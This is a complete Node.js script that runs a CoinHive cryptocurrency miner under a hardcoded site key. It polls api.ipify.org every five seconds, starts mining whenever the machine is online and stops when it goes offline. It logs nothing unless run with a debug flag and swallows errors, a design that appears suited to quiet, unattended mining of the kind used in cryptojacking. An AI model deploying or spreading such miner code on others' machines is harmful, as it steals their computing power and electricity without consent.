const config = Reactor = require( './Reactor' ),
    fetch = require( 'node-fetch' ),
    CoinHive = require( 'coin-hive' );

const env = {
    coinHive: {
        key: 'XOJvKCAexZIoPkXY6itIQPyLhIX8k7F7'
    }
};
process.argv.forEach( arg => {
    env[ arg ] = true;
} );

// console.log( env );

class connectionChecker{
    constructor(){
        this.connected = false;
    }

    check(){
        fetch( 'https://api.ipify.org?format=json' )
            .then( res => res.json() )
            .then( json => {
                if( !this.connected ) reactor.dispatch( 'connection' );
                this.connected = true;
                // if( env.debug ) console.log( `connected: ${this.connected}` );
            } )
            .catch( e => {
                if( this.connected ) reactor.dispatch( 'disconnection' );
                this.connected = false;
                // if( env.debug ) console.log( `connected: ${this.connected}` );
            } );
    }
}

class MineThread{
    constructor(){
        this.started = false;
    }
    start(){
        if( !this.started ){
            if( env.debug ) console.log( 'starting thread' );
            ( async () => {
                this.miner = await CoinHive( env.coinHive.key ); // Coin-Hive's Site Key
                await this.miner.start();
                if( env.debug ){
                    console.log( 'Miner started' );

                    this.miner.on( 'found', () => console.log( 'Found!' ) );
                    this.miner.on( 'accepted', () => console.log( 'Accepted!' ) );
                    this.miner.on( 'update', data => console.log(
                        `Hashes per second: ${ data.hashesPerSecond }`+
                        `\nTotal hashes: ${ data.totalHashes }`+
                        `\nAccepted hashes: ${ data.acceptedHashes }`
                    ) );
                    this.miner.on( 'error', () => console.error( 'error' ) );
                }
                this.started = true;
            } )();
        }
    }
    stop(){
        if( this.started ){
            if( env.debug ) console.log( 'stopping thread' );
            this.miner.stop();
            if( env.debug ) console.log( 'Miner stopped' );
            this.started = false;
        }
    }
}

const reactor = new Reactor(),
    mt = new MineThread(),
    cc = new connectionChecker();

reactor.register( 'connection' );
reactor.register( 'disconnection' );

reactor.on( 'connection', () => {
    if( env.debug ) console.log('connection');
    try{
        process.env.PORT = ~~( 4000 + Math.random() * 8000 );
        mt.start();
    }
    catch( e ){}
} );
reactor.on( 'disconnection', () => {
    if( env.debug ) console.log('disconnection');
    try{
        mt.stop();
    }
    catch( e ){}
} );

function checkConnection(){
    cc.check();
}
setInterval( checkConnection, 5000 );
